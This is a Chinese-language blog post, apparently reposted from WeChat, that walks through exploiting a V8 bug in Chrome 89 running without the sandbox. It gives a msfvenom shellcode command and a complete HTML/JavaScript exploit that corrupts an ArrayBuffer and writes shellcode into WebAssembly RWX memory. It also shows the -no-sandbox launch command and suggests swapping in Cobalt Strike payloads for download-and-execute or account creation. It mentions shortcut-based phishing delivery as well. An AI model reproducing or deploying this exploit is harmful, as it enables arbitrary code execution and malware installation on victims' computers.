> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/870vThUuYS0CKSU06uzADg)

  

该漏洞主要利用在 - no-sandbox 模式下，也是有利用场景的，具体要看各位师傅怎么发挥啦！

![](https://mmbiz.qpic.cn/mmbiz_gif/rJALXSMzgelgYXUwsxribAz956ruaQGZZ9gezX82vCPAbp140PrhqtibLiaLnt6KmYJia7UhV1KICRTYojSS3v3f6g/640?wx_fmt=gif)

  

漏洞影响范围

利用条件：未开启沙盒、 X86 架构 CPU 如 Intel、AMD 等、浏览器需运行在 64 位模式、

1. 生成 shellcode

  

```
msfvenom -a x64 -p windows/x64/exec CMD="msg.exe 1 By EDI" EXITFUNC=thread -f num
```

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgelgYXUwsxribAz956ruaQGZZKhfZrTQtMBl1ZA6PLsNo4LvygPo5wNaQkTrvjdib1JI7h2BXHJGwPuQ/640?wx_fmt=png)

当然你也可以选择使用 CS 的 shellcode 进行上线，我这里只是为了做测试，所以只弹了个 msg

师傅们也可以修改 cmd 值的内容，生成 shellcode ，进行下载执行，加账户等操作。

2. 修改 POC  

  

```
<script>
    function gc() {
        for (var i = 0; i < 0x80000; ++i) {
            var a = new ArrayBuffer();
        }
    }
    let shellcode = [shellcode 区域];
    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var main = wasmInstance.exports.main;
    var bf = new ArrayBuffer(8);
    var bfView = new DataView(bf);
    function fLow(f) {
        bfView.setFloat64(0, f, true);
        return (bfView.getUint32(0, true));
    }
    function fHi(f) {
        bfView.setFloat64(0, f, true);
        return (bfView.getUint32(4, true))
    }
    function i2f(low, hi) {
        bfView.setUint32(0, low, true);
        bfView.setUint32(4, hi, true);
        return bfView.getFloat64(0, true);
    }
    function f2big(f) {
        bfView.setFloat64(0, f, true);
        return bfView.getBigUint64(0, true);
    }
    function big2f(b) {
        bfView.setBigUint64(0, b, true);
        return bfView.getFloat64(0, true);
    }
    class LeakArrayBuffer extends ArrayBuffer {
        constructor(size) {
            super(size);
            this.slot = 0xb33f;
        }
    }
    function foo(a) {
        let x = -1;
        if (a) x = 0xFFFFFFFF;
        var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));
        arr.shift();
        let local_arr = Array(2);
        local_arr[0] = 5.1;//4014666666666666
        let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8
        arr[0] = 0x1122;
        return [arr, local_arr, buff];
    }
    for (var i = 0; i < 0x10000; ++i)
        foo(false);
    gc(); gc();
    [corrput_arr, rwarr, corrupt_buff] = foo(true);
    corrput_arr[12] = 0x22444;
    delete corrput_arr;
    function setbackingStore(hi, low) {
        rwarr[4] = i2f(fLow(rwarr[4]), hi);
        rwarr[5] = i2f(low, fHi(rwarr[5]));
    }
    function leakObjLow(o) {
        corrupt_buff.slot = o;
        return (fLow(rwarr[9]) - 1);
    }
    let corrupt_view = new DataView(corrupt_buff);
    let corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);
    let idx0Addr = corrupt_buffer_ptr_low - 0x10;
    let baseAddr = (corrupt_buffer_ptr_low & 0xffff0000) - ((corrupt_buffer_ptr_low & 0xffff0000) % 0x40000) + 0x40000;
    let delta = baseAddr + 0x1c - idx0Addr;
    if ((delta % 8) == 0) {
        let baseIdx = delta / 8;
        this.base = fLow(rwarr[baseIdx]);
    } else {
        let baseIdx = ((delta - (delta % 8)) / 8);
        this.base = fHi(rwarr[baseIdx]);
    }
    let wasmInsAddr = leakObjLow(wasmInstance);
    setbackingStore(wasmInsAddr, this.base);
    let code_entry = corrupt_view.getFloat64(13 * 8, true);
    setbackingStore(fLow(code_entry), fHi(code_entry));
    for (let i = 0; i < shellcode.length; i++) {
        corrupt_view.setUint8(i, shellcode[i]);
    }
    main();
</script>
```

wasmCode 的内容无需修改

Chrome 可以直接执行其它高级语言生成的机器码，从而加快运行效率。

wasm 的内存页是 RWX 可读可写可执行的，但是通过 C 转换后的 wasm 并无法执行需要导入库执行的函数

所以我们需要编写一段 wasm 构造一块 RWX 内存页

通过漏洞将 shellcode 覆写 原本属于 wasm 的内存页中

后面调用 wasm 接口时，就触发了我们的 shellcode

（本人不是 PWN 手，如有分析有误 还请师傅们莫见怪）

3. 运行 chrome 打开 poc.html

  

  

```
chrome.exe -no-sandbox
```

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgelgYXUwsxribAz956ruaQGZZ4zJ7icysalghVqrxwMcU7hlx4mpgWiclXy0aHibATCk9mVcgSRvokUiaBw/640?wx_fmt=png)

切到 Chrome 所在目录即可

效果如下

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgelgYXUwsxribAz956ruaQGZZjiaYx5fHCCvb2diahKd9kBd9Kwbj4whPFEOA2Sc7Vq8AIHz7eoK3g4Mg/640?wx_fmt=png)

```
测试环境
Windows10 x64 
Chrome 89.0.4389.128
```

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgelgYXUwsxribAz956ruaQGZZrQIEicgr0SBrJMribYKnGQx1fMgQxBNfVmTyamKIyib1w5h6EX9NqUT2w/640?wx_fmt=png)

关于该漏洞的利用，已经有师傅做了快捷方式钓鱼的形式进行投马、当然还有其它玩法。

```
"C:\Program Files\Google\Chrome\Application\chrome.exe" -no-sandbox file:///C:/Users/admin/Desktop/exploits-master/chrome-0day/EDI.html
```

![](https://mmbiz.qpic.cn/mmbiz_gif/rJALXSMzgelgYXUwsxribAz956ruaQGZZqlufZgVCYOeKx2Vj7DkAibiciaQxDoNOBFCbevGiaxQOXKDrYFd7sY2X6A/640?wx_fmt=gif)